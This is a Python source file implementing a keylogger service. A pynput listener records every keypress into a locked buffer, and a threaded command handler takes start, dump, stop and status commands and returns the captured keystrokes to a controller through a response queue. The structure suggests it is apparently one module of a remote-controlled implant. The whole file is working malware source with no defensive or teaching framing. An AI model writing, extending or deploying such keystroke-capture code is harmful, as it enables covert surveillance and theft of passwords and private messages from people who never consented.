import threading
from queue import Queue, Empty
from pynput.keyboard import Listener

class KeyloggerService:
    """
    Manages the keylogging functionality, including its state, threads, and buffer.
    This service is stateful ('STOPPED' or 'RUNNING').
    """
    def __init__(self, response_queue: Queue):
        self.response_queue = response_queue # Queue to send async responses to the controller
        self.state = 'STOPPED'
        self.key_buffer = []
        self.key_buffer_lock = threading.Lock()
        
        # --- REFACTOR: Initialize listener and handler to None for clarity ---
        self.listener = None
        self.handler_thread = None
        
        # --- REFACTOR: Initialize the command queue in the constructor ---
        # This is the primary fix. It guarantees self.command_queue is never None.
        self.command_queue = Queue()

    def _on_press(self, key):
        key_str = ''
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            elif hasattr(key, 'name'):
                key_str = f'[{key.name.upper()}]'
            else:
                key_str = '[UNKNOWN]'
        except Exception:
            key_str = '[PROC_ERR]'
        
        with self.key_buffer_lock:
            self.key_buffer.append(key_str)

    def _key_buffer_handler(self, start_token):
        while True:
            # This call is now safe.
            command = self.command_queue.get()
            
            # Graceful shutdown check
            if command is None:
                break
                
            dump_token = command.get("token")
            command_type = command.get("type")

            if command_type in ('DUMP', 'STOP'):
                local_key_buffer = []
                with self.key_buffer_lock:
                    if self.key_buffer:
                        local_key_buffer = self.key_buffer
                        self.key_buffer = []
                
                dump_message = "Keylog buffer was empty."
                if local_key_buffer:
                    dump_message = f"Keylog Dump:\n{''.join(local_key_buffer)}"
                
                response = {"source": "internal", "token": dump_token, "type": "RSP", "payload": dump_message}
                self.response_queue.put(response)

            if command_type == 'STOP':
                response = {"source": "internal", "token": dump_token, "type": "RSP", "payload": "Keylogger is now STOPPED."}
                self.response_queue.put(response)
                break

    def start(self, token):
        if self.state != 'STOPPED':
            return f"[Error] Keylogger is already {self.state}."
        
        self.state = 'INITIALIZING'
        self.key_buffer = []

        # --- REFACTOR: Clear the queue on start instead of creating a new one ---
        while not self.command_queue.empty():
            try:
                self.command_queue.get_nowait()
            except Empty:
                break
        
        # Create and start the handler and listener threads
        self.handler_thread = threading.Thread(target=self._key_buffer_handler, args=(token,), daemon=True)
        self.listener = Listener(on_press=self._on_press)
        
        self.handler_thread.start()
        self.listener.start()
        
        self.state = 'RUNNING'
        return "Keylogger is now RUNNING."

    def stop(self, token):
        if self.state != 'RUNNING':
            return f"[Error] Keylogger is not running."
        
        # Stop the listener thread if it exists and is running
        if self.listener and self.listener.is_alive():
            self.listener.stop()
            self.listener.join()
        
        self.listener = None
        self.command_queue.put({"type": "STOP", "token": token})
        self.state = 'STOPPED'
        return "Shutdown sequence initiated. Awaiting final dump."

    def dump(self, token):
        if self.state != 'RUNNING':
            return f"[Error] Cannot dump, keylogger is not running."
        
        # Health Check on the listener object
        if not (self.listener and self.listener.is_alive()):
            self.state = 'STOPPED'
            return "[CRITICAL] Keylogger listener thread has died. State reset to STOPPED."
            
        self.command_queue.put({"type": "DUMP", "token": token})
        return "Dump command queued."

    def get_status(self):
        return f"Keylogger state is currently: {self.state}"